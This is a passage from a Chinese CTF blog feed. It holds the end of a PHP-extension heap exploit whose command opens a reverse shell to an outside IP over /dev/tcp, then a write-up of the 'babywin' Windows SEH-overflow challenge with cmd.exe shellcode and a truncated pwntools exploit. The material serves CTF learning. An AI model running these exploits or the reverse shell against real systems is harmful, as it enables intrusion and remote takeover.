class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$heap_base</span> = <span class="number">0</span>;</span><br><span class="line"><span class="variable">$libc_base</span> = <span class="number">0</span>;</span><br><span class="line"><span class="variable">$libc</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"><span class="variable">$mbase</span> = <span class="string">&quot;&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">u64</span>(<span class="params"><span class="variable">$leak</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$leak</span> = <span class="title function_ invoke__">strrev</span>(<span class="variable">$leak</span>);</span><br><span class="line">    <span class="variable">$leak</span> = <span class="title function_ invoke__">bin2hex</span>(<span class="variable">$leak</span>);</span><br><span class="line">    <span class="variable">$leak</span> = <span class="title function_ invoke__">hexdec</span>(<span class="variable">$leak</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$leak</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">p64</span>(<span class="params"><span class="variable">$addr</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$addr</span> = <span class="title function_ invoke__">dechex</span>(<span class="variable">$addr</span>);</span><br><span class="line">    <span class="variable">$addr</span> = <span class="title function_ invoke__">hex2bin</span>(<span class="variable">$addr</span>);</span><br><span class="line">    <span class="variable">$addr</span> = <span class="title function_ invoke__">strrev</span>(<span class="variable">$addr</span>);</span><br><span class="line">    <span class="variable">$addr</span> = <span class="title function_ invoke__">str_pad</span>(<span class="variable">$addr</span>, <span class="number">8</span>, <span class="string">&quot;\x00&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="variable">$addr</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">leakaddr</span>(<span class="params"><span class="variable">$buffer</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$libc</span>,<span class="variable">$mbase</span>;</span><br><span class="line">    <span class="variable">$p</span> = <span class="string">&#x27;/([0-9a-f]+)\-[0-9a-f]+ .* \/usr\/lib\/x86_64-linux-gnu\/libc.so.6/&#x27;</span>;</span><br><span class="line">    <span class="variable">$p1</span> = <span class="string">&#x27;/([0-9a-f]+)\-[0-9a-f]+ .*  \/usr\/local\/lib\/php\/extensions\/no-debug-non-zts-20230831\/vuln.so/&#x27;</span>;</span><br><span class="line">    <span class="title function_ invoke__">preg_match_all</span>(<span class="variable">$p</span>, <span class="variable">$buffer</span>, <span class="variable">$libc</span>);</span><br><span class="line">    <span class="title function_ invoke__">preg_match_all</span>(<span class="variable">$p1</span>, <span class="variable">$buffer</span>, <span class="variable">$mbase</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">leak</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$libc_base</span>, <span class="variable">$module_base</span>, <span class="variable">$libc</span>, <span class="variable">$mbase</span>;</span><br><span class="line"></span><br><span class="line">    <span class="title function_ invoke__">ob_start</span>(<span class="string">&quot;leakaddr&quot;</span>);</span><br><span class="line">    <span class="keyword">include</span>(<span class="string">&quot;/proc/self/maps&quot;</span>);</span><br><span class="line">    <span class="variable">$buffer</span> = <span class="title function_ invoke__">ob_get_contents</span>();</span><br><span class="line">    <span class="title function_ invoke__">ob_end_flush</span>();</span><br><span class="line">    <span class="title function_ invoke__">leakaddr</span>(<span class="variable">$buffer</span>);</span><br><span class="line">    <span class="variable">$libc_base</span>=<span class="title function_ invoke__">hexdec</span>(<span class="variable">$libc</span>[<span class="number">1</span>][<span class="number">0</span>]);</span><br><span class="line">    <span class="variable">$module_base</span>=<span class="title function_ invoke__">hexdec</span>(<span class="variable">$mbase</span>[<span class="number">1</span>][<span class="number">0</span>]);</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">attack</span>(<span class="params"><span class="variable">$cmd</span></span>)</span>&#123;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$libc_base</span>, <span class="variable">$module_base</span>;</span><br><span class="line">    <span class="variable">$payload</span> = <span class="title function_ invoke__">str_pad</span>(<span class="title function_ invoke__">p64</span>(<span class="variable">$module_base</span> + <span class="number">0x4038</span>).<span class="title function_ invoke__">p64</span>(<span class="number">0xff</span>), <span class="number">0x40</span>, <span class="string">&quot;\x90&quot;</span>);</span><br><span class="line">    <span class="variable">$gadget</span> = <span class="title function_ invoke__">p64</span>(<span class="variable">$libc_base</span> + <span class="number">0x4c490</span>);</span><br><span class="line">    <span class="title function_ invoke__">addHacker</span>(<span class="title function_ invoke__">str_repeat</span>(<span class="string">&quot;\x90&quot;</span>, <span class="number">0x8</span>), <span class="title function_ invoke__">str_repeat</span>(<span class="string">&quot;\x90&quot;</span>, <span class="number">0x30</span>));</span><br><span class="line">    <span class="title function_ invoke__">addHacker</span>(<span class="variable">$payload</span>, <span class="title function_ invoke__">str_repeat</span>(<span class="string">&quot;\x90&quot;</span>, <span class="number">0x2f</span>));<span class="comment">//下下个chunk也就是,$payload所在chunk又是之前那个,所以现在覆盖了ptr</span></span><br><span class="line">    <span class="title function_ invoke__">addHacker</span>(<span class="title function_ invoke__">str_pad</span>(<span class="variable">$cmd</span>, <span class="number">0x20</span>, <span class="string">&quot;\x00&quot;</span>), <span class="string">&quot;114514&quot;</span>);</span><br><span class="line">    <span class="title function_ invoke__">editHacker</span>(<span class="number">0</span>, <span class="variable">$gadget</span>);<span class="comment">//edit就是在任意写了</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">main</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$cmd</span> = <span class="string">&#x27;bash -c &quot;bash -i &gt;&amp; /dev/tcp/114.514.19.19/810 0&gt;&amp;1&quot;&#x27;</span>;<span class="comment">//= =</span></span><br><span class="line">    <span class="title function_ invoke__">leak</span>();</span><br><span class="line">    <span class="title function_ invoke__">attack</span>(<span class="variable">$cmd</span>);</span><br><span class="line">    <span class="title function_ invoke__">removeHacker</span>(<span class="number">2</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">main</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>]]></content>
    
    
    <summary type="html">php is good</summary>
    
    
    
    <category term="pwn" scheme="https://ixout.github.io/categories/pwn/"/>
    
    
    <category term="phppwn" scheme="https://ixout.github.io/tags/phppwn/"/>
    
  </entry>
  
  <entry>
    <title>西湖论剑babywin复现</title>
    <link href="https://ixout.github.io/posts/57890/"/>
    <id>https://ixout.github.io/posts/57890/</id>
    <published>2024-04-15T15:18:04.000Z</published>
    <updated>2024-11-20T14:11:46.239Z</updated>
    
    <content type="html"><![CDATA[<h1 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h1><p>题目给的附件有三个文件,一个exe,两个dll</p><p>先对exe进行checksec</p><p><img src="https://cdn.jsdelivr.net/gh/ixout/ixout.github.io@main/img/2024-04-16_161739.png" alt=""></p><p>比较重要的几个</p><ul><li>没有栈不可执行</li><li>存在(GS)canary</li><li>没有地址随机化</li></ul><p>ida打开exe分析,程序是32位</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> *<span class="title function_">sub_401060</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  FILE *v0; <span class="comment">// eax</span></span><br><span class="line">  <span class="type">const</span> <span class="type">void</span> *v2; <span class="comment">// [esp+0h] [ebp-8h]</span></span><br><span class="line">  <span class="type">char</span> *Buffer; <span class="comment">// [esp+4h] [ebp-4h]</span></span><br><span class="line"></span><br><span class="line">  v2 = (<span class="type">const</span> <span class="type">void</span> *)gift();</span><br><span class="line">  Buffer = (<span class="type">char</span> *)<span class="built_in">malloc</span>(<span class="number">0x1000</span>u);</span><br><span class="line">  output(<span class="string">&quot;your gift: %p\n&quot;</span>, v2);</span><br><span class="line">  output(<span class="string">&quot;give your data:&quot;</span>);</span><br><span class="line">  v0 = _acrt_iob_func(<span class="number">0</span>);</span><br><span class="line">  fgets(Buffer, <span class="number">200</span>, v0);</span><br><span class="line">  <span class="keyword">return</span> overflow(Buffer);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">char</span> *__cdecl <span class="title function_">overflow</span><span class="params">(<span class="type">char</span> *Source)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> Destination[<span class="number">32</span>]; <span class="comment">// [esp+0h] [ebp-24h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">strcpy</span>(Destination, Source);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">strcat</span>(Destination, Source);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以明显地发现一个溢出漏洞,如果在linux平台下这就是最简单的栈溢出了</p><p>但在windows环境下,不太熟悉</p><h1 id="尝试"><a href="#尝试" class="headerlink" title="尝试"></a>尝试</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">your gift: 00000009</span><br><span class="line">give your data:aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa</span><br></pre></td></tr></table></figure><p><code>your gift</code>没啥用,只是加载了<code>gift.dll</code>模块</p><p>data我们先尝试随便输点东西</p><p>结果</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">(a7c<span class="number">.3314</span>): Access violation - code <span class="title function_">c0000005</span> <span class="params">(first chance)</span></span><br><span class="line">First chance exceptions are reported before any exception handling.</span><br><span class="line">This exception may be expected and handled.</span><br><span class="line">eax=<span class="number">0000000</span>a ebx=<span class="number">002f</span>5000 ecx=<span class="number">61616161</span> edx=<span class="number">7</span>efeff09 esi=<span class="number">005646</span>c8 edi=<span class="number">0019f</span>f5d</span><br><span class="line">eip=<span class="number">762</span>ec8b1 esp=<span class="number">0019f</span>ed8 ebp=<span class="number">0019f</span>f0c iopl=<span class="number">0</span>         nv up ei pl nz na po nc</span><br><span class="line">cs=<span class="number">0023</span>  ss=<span class="number">002b</span>  ds=<span class="number">002b</span>  es=<span class="number">002b</span>  fs=<span class="number">0053</span>  gs=<span class="number">002b</span>             efl=<span class="number">00010202</span></span><br><span class="line">ucrtbase!<span class="built_in">strcat</span>+<span class="number">0x71</span>:</span><br><span class="line"><span class="number">762</span>ec8b1 <span class="number">8</span>a11            mov     dl,byte ptr [ecx]          ds:<span class="number">002b</span>:<span class="number">61616161</span>=??</span><br></pre></td></tr></table></figure><p>在strcat函数内出错了</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> *__cdecl <span class="title function_">overflow</span><span class="params">(<span class="type">char</span> *Source)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> Destination[<span class="number">32</span>]; <span class="comment">// [esp+0h] [ebp-24h] BYREF</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">strcpy</span>(Destination, Source);</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">strcat</span>(Destination, Source);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这其中存在栈溢出,一开始还想不太通为啥会出错,然后突然意识到这是32位的程序,参数通过栈传递的,那么溢出就已经把栈中保存的参数给覆盖了</p><hr><p>看到程序没有开启NX又没有后门的情况下</p><p>第一时间想到的是ret2shellcode,但有两个问题:</p><ol><li>没有这样的gadget可供使用</li><li>canary的存在</li></ol><p>这都是在已有的条件下无法解决的问题</p><p>此时就需要利用windows下的SEH机制了,<strong>SEH链是保存在栈中的</strong>,发生异常时,会遍历SEH中的处理函数直到找到可以处理的函数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>:<span class="number">001</span>&gt; !teb</span><br><span class="line">TEB at <span class="number">002f</span>8000</span><br><span class="line">    ExceptionList:        <span class="number">0019f</span>f60</span><br><span class="line">    StackBase:            <span class="number">001</span>a0000</span><br><span class="line">    StackLimit:           <span class="number">0019</span>d000</span><br><span class="line">    SubSystemTib:         <span class="number">00000000</span></span><br><span class="line">    FiberData:            <span class="number">00001e00</span></span><br><span class="line">    ArbitraryUserPointer: <span class="number">00000000</span></span><br><span class="line">    Self:                 <span class="number">002f</span>8000</span><br><span class="line">    EnvironmentPointer:   <span class="number">00000000</span></span><br><span class="line">    ClientId:             <span class="number">00000</span>a7c . <span class="number">00003314</span></span><br><span class="line">    RpcHandle:            <span class="number">00000000</span></span><br><span class="line">    Tls Storage:          <span class="number">00564</span>d30</span><br><span class="line">    PEB Address:          <span class="number">002f</span>5000</span><br><span class="line">    LastErrorValue:       <span class="number">0</span></span><br><span class="line">    LastStatusValue:      <span class="number">0</span></span><br><span class="line">    Count Owned Locks:    <span class="number">0</span></span><br><span class="line">    HardErrorMode:        <span class="number">0</span></span><br><span class="line"><span class="number">0</span>:<span class="number">001</span>&gt; dps <span class="number">0019f</span>f60 l2</span><br><span class="line"><span class="number">0019f</span>f60  <span class="number">0019f</span>fcc</span><br><span class="line"><span class="number">0019f</span>f64  <span class="number">00401b</span>28 babywin+<span class="number">0x1b28</span></span><br></pre></td></tr></table></figure><p>如果我们溢出到该处那么就可以劫持异常处理流</p><p>我们下一个断点看看正常处理下会是怎样的</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>:<span class="number">000</span>&gt; g</span><br><span class="line">(<span class="number">27f</span>8<span class="number">.323</span>c): Access violation - code <span class="title function_">c0000005</span> <span class="params">(first chance)</span></span><br><span class="line">First chance exceptions are reported before any exception handling.</span><br><span class="line">This exception may be expected and handled.</span><br><span class="line">eax=<span class="number">0019000</span>a ebx=<span class="number">002</span>d5000 ecx=<span class="number">61616161</span> edx=<span class="number">7f</span>17ff09 esi=<span class="number">005746e8</span> edi=<span class="number">0019f</span>f71</span><br><span class="line">eip=<span class="number">762</span>ec8b1 esp=<span class="number">0019f</span>ed8 ebp=<span class="number">0019f</span>f0c iopl=<span class="number">0</span>         nv up ei pl nz na po nc</span><br><span class="line">cs=<span class="number">0023</span>  ss=<span class="number">002b</span>  ds=<span class="number">002b</span>  es=<span class="number">002b</span>  fs=<span class="number">0053</span>  gs=<span class="number">002b</span>             efl=<span class="number">00010202</span></span><br><span class="line">ucrtbase!<span class="built_in">strcat</span>+<span class="number">0x71</span>:</span><br><span class="line"><span class="number">762</span>ec8b1 <span class="number">8</span>a11            mov     dl,byte ptr [ecx]          ds:<span class="number">002b</span>:<span class="number">61616161</span>=??</span><br><span class="line"><span class="number">0</span>:<span class="number">000</span>&gt; dd esp l10</span><br><span class="line"><span class="number">0019f</span>ed8  <span class="number">0057b</span>8d0 <span class="number">0040110</span>d <span class="number">0019f</span>ee8 <span class="number">61616161</span></span><br><span class="line"><span class="number">0019f</span>ee8  <span class="number">61616161</span> <span class="number">61616161</span> <span class="number">61616161</span> <span class="number">61616161</span></span><br><span class="line"><span class="number">0019f</span>ef8  <span class="number">61616161</span> <span class="number">61616161</span> <span class="number">61616161</span> <span class="number">61616161</span></span><br><span class="line"><span class="number">0019f</span>f08  <span class="number">61616161</span> <span class="number">61616161</span> <span class="number">61616161</span> <span class="number">61616161</span></span><br><span class="line"><span class="number">0</span>:<span class="number">000</span>&gt; d <span class="number">0019f</span>ee8 l20</span><br><span class="line"><span class="number">0019f</span>ee8  <span class="number">61616161</span> <span class="number">61616161</span> <span class="number">61616161</span> <span class="number">61616161</span></span><br><span class="line"><span class="number">0019f</span>ef8  <span class="number">61616161</span> <span class="number">61616161</span> <span class="number">61616161</span> <span class="number">61616161</span></span><br><span class="line"><span class="number">0019f</span>f08  <span class="number">61616161</span> <span class="number">61616161</span> <span class="number">61616161</span> <span class="number">61616161</span></span><br><span class="line"><span class="number">0019f</span>f18  <span class="number">61616161</span> <span class="number">61616161</span> <span class="number">61616161</span> <span class="number">61616161</span></span><br><span class="line"><span class="number">0019f</span>f28  <span class="number">61616161</span> <span class="number">61616161</span> <span class="number">61616161</span> <span class="number">61616161</span></span><br><span class="line"><span class="number">0019f</span>f38  <span class="number">61616161</span> <span class="number">61616161</span> <span class="number">61616161</span> <span class="number">61616161</span></span><br><span class="line"><span class="number">0019f</span>f48  <span class="number">61616161</span> <span class="number">61616161</span> <span class="number">61616161</span> <span class="number">61616161</span></span><br><span class="line"><span class="number">0019f</span>f58  <span class="number">61616161</span> <span class="number">61616161</span> <span class="number">61616161</span> <span class="number">61616161</span></span><br></pre></td></tr></table></figure><p>异常触发时,此时还是strcat函数的栈</p><p><code>0019fee8</code>是<code>dst</code>,<code>61616161</code>是<code>src</code>,显然后者不可访问,发生错误</p><p>继续跟进异常处理,如下:</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>:<span class="number">000</span>&gt; g</span><br><span class="line">Breakpoint <span class="number">0</span> hit</span><br><span class="line">eax=<span class="number">00000000</span> ebx=<span class="number">00000000</span> ecx=<span class="number">00401b</span>28 edx=<span class="number">77808</span>ad0 esi=<span class="number">00000000</span> edi=<span class="number">00000000</span></span><br><span class="line">eip=<span class="number">00401b</span>28 esp=<span class="number">0019f</span>918 ebp=<span class="number">0019f</span>938 iopl=<span class="number">0</span>         nv up ei pl zr na pe nc</span><br><span class="line">cs=<span class="number">0023</span>  ss=<span class="number">002b</span>  ds=<span class="number">002b</span>  es=<span class="number">002b</span>  fs=<span class="number">0053</span>  gs=<span class="number">002b</span>             efl=<span class="number">00000246</span></span><br><span class="line">babywin+<span class="number">0x1b28</span>:</span><br><span class="line"><span class="number">00401b</span>28 <span class="number">55</span>              push    ebp</span><br><span class="line"><span class="number">0</span>:<span class="number">000</span>&gt; dd esp l20</span><br><span class="line"><span class="number">0019f</span>918  <span class="number">77808</span>ab2 <span class="number">0019f</span>a18 <span class="number">0019f</span>f60 <span class="number">0019f</span>a68</span><br><span class="line"><span class="number">0019f</span>928  <span class="number">0019f</span>9a4 <span class="number">0019f</span>f60 <span class="number">77808</span>ad0 <span class="number">0019f</span>f60</span><br><span class="line"><span class="number">0019f</span>938  <span class="number">0019f</span>a00 <span class="number">77808</span>a84 <span class="number">0019f</span>a18 <span class="number">0019f</span>f60</span><br><span class="line"><span class="number">0019f</span>948  <span class="number">0019f</span>a68 <span class="number">0019f</span>9a4 <span class="number">00401b</span>28 <span class="number">0019f</span>f60</span><br><span class="line"><span class="number">0019f</span>958  <span class="number">0019f</span>a18 <span class="number">00000000</span> <span class="number">777e92</span>ef <span class="number">0019f</span>a18</span><br><span class="line"><span class="number">0019f</span>968  <span class="number">0019f</span>f60 <span class="number">0019f</span>a68 <span class="number">0019f</span>9a4 <span class="number">00401b</span>28</span><br><span class="line"><span class="number">0019f</span>978  <span class="number">0019f</span>f35 <span class="number">00734588</span> <span class="number">0019f</span>a18 <span class="number">00000000</span></span><br><span class="line"><span class="number">0019f</span>988  <span class="number">0019f</span>a68 <span class="number">0019f</span>f60 <span class="number">00000032</span> <span class="number">0019</span>d000</span><br></pre></td></tr></table></figure><p>当执行到此处时,栈上会是这样一个状态,我们着重关注<code>esp+8</code>,发现其正好<strong>是当前的<code>ExceptionList</code></strong>(此时eip就由其handler决定),<u>而且这是一个距离可控栈比较近的地址</u></p><p>所以如果劫持这个handler为<code>pop ?;pop?;ret</code>那么就可以回到栈上执行shellcode</p><p>然后<code>0019ff60</code>处再写个jmp跳开handler指针,执行shellcode</p><p>不过这里还有一个问题,babywin开启了safeseh,所以我们需要找一个<u>没有开启该保护的模块</u>去找需要的gadget</p><p>发现<code>gift.dll</code>就刚好满足这个条件</p><p>而且能够找到不少gadget</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">0x271f16ac pop ecx; pop ebp; ret</span><br><span class="line">0x271f1794 pop esi; pop ebp; ret</span><br><span class="line">0x271f19c9 pop esi; pop ebx; ret</span><br><span class="line">0x271f19f5 pop esi; pop ebx; ret</span><br><span class="line">0x271f1a84 pop esi; pop ebp; ret</span><br></pre></td></tr></table></figure><h1 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h1><p>我们只需要在检查gs之前,触发错误处理</p><p>就能够控制执行任意shellcode</p><p>先确认一下偏移,由之前的数据可以得知</p><p><code>offset=0x19ff60-0x19fee8=120</code></p><p>偏移确定,现在需要解决如何编写shellcode,不像linux平台下我们可以直接使用syscall来做一些系统级的调用方便getshell或者row</p><p>windows的shellcode编写更为复杂一点</p><p>不过好在我们可以直接借用某些工具,例如<a href="https://github.com/NytroRST/ShellcodeCompiler/tree/master">NytroRST/ShellcodeCompiler: Shellcode Compiler (github.com)</a></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">function <span class="title function_">WinExec</span><span class="params">(<span class="string">&quot;kernel32.dll&quot;</span>)</span>;</span><br><span class="line">function <span class="title function_">ExitProcess</span><span class="params">(<span class="string">&quot;kernel32.dll&quot;</span>)</span>;</span><br><span class="line"></span><br><span class="line">WinExec(<span class="string">&quot;cmd.exe&quot;</span>,<span class="number">0</span>);</span><br><span class="line">ExitProcess(<span class="number">0</span>);</span><br></pre></td></tr></table></figure><p>使用<code>.\ShellcodeCompiler_x86.exe -r .\source.txt -o shellcode.bin -a shellcode.asm -p win_x86</code>导出结果</p><p>还要注意需要二次读取足够的shellcode</p><p><strong>exp:(不懂为什么只有windbg调试的情况下,才能成功)</strong></p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> * </span><br><span class="line"></span><br><span class="line">pop2 = <span class="number">0x271f16ac</span> <span class="comment">#: pop ecx ; pop ebp ; ret</span></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line">context.arch=<span class="string">&#x27;i386&#x27;</span></span><br><span class="line">p = remote(<span class="string">&quot;192.168.137.1&quot;</span>,<span class="number">12978</span>)</span><br><span class="line"></span><br><span class="line">shell = <span class="string">b&#x27;1\xc9d\x8bA0\x8b@\x0c\x8bp\x14\xad\x96\xad\x8bX\x10\x8bS&lt;\x01\xda\x8bRx\x01\xda\x8br \x01\xde1\xc9A\xad\x01\xd8\x818GetPu\xf4\x81x\x04rocAu\xeb\x81x\x08ddreu\xe2\x8br$\x01\xdef\x8b\x0cNI\x8br\x1c\x01\xde\x8b\x14\x8e\x01\xda1\xc9SRQharyAhLibrhLoadTS\xff\xd2\x83\xc4\x0cYP1\xc0\xb8xec#P\x83l$\x03#hWinET\xfft$\x14\xffT$\x14\x83\xc4\x08P1\xc0\xb8ess#P\x83l$\x03#hProchExitT\xfft$\x1c\xffT$\x1c\x83\xc4\x0cP1\xc0\xb8exe#P\x83l$\x03#hcmd.T1\xc0P\xfft$\x04\xffT$\x18\x83\xc4\x0c1\xc0P\xffT$\x04&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">assert</span>(<span class="string">b&#x27;\n&#x27;</span> <span class="keyword">not</span> <span class="keyword">in</span> shell)</span><br><span class="line"></span><br><span class="line"><span class="comment"># eip = p32(0x62616167)</span></span><br><span class="line"><span class="comment"># payload = b&#x27;aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab&#x27;</span></span><br><span class="line"><span class="comment"># offset = cyclic_find(payload,eip)</span></span><br><span class="line"><span class="comment"># success(&#x27;offset : &#x27; + hex(offset))</span></span><br><span class="line"></span><br><span class="line">shellcode = <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    mov ecx,0x01010101</span></span><br><span class="line"><span class="string">    mov eax,0x14121bd           /*__acrt_iob_func*/</span></span><br><span class="line"><span class="string">    xor eax,ecx </span></span><br><span class="line"><span class="string">    mov ebx,[eax]</span></span><br><span class="line"><span class="string">    xor ecx,ecx</span></span><br><span class="line"><span class="string">    push ecx</span></span><br><span class="line"><span class="string">    call ebx</span></span><br><span class="line"><span class="string">    pop ecx</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    push eax</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    mov ecx,0x01010101          /*fgets*/</span></span><br><span class="line"><span class="string">    push ecx</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    xor eax,eax</span></span><br><span class="line"><span class="string">    push eax</span></span><br><span class="line"><span class="string">emmm:</span></span><br><span class="line"><span class="string">    pop eax</span></span><br><span class="line"><span class="string">    test eax,eax</span></span><br><span class="line"><span class="string">    jnz read</span></span><br><span class="line"><span class="string">    call near ptr emmm</span></span><br><span class="line"><span class="string">read:</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    sub ax,0x3010</span></span><br><span class="line"><span class="string">    push eax</span></span><br><span 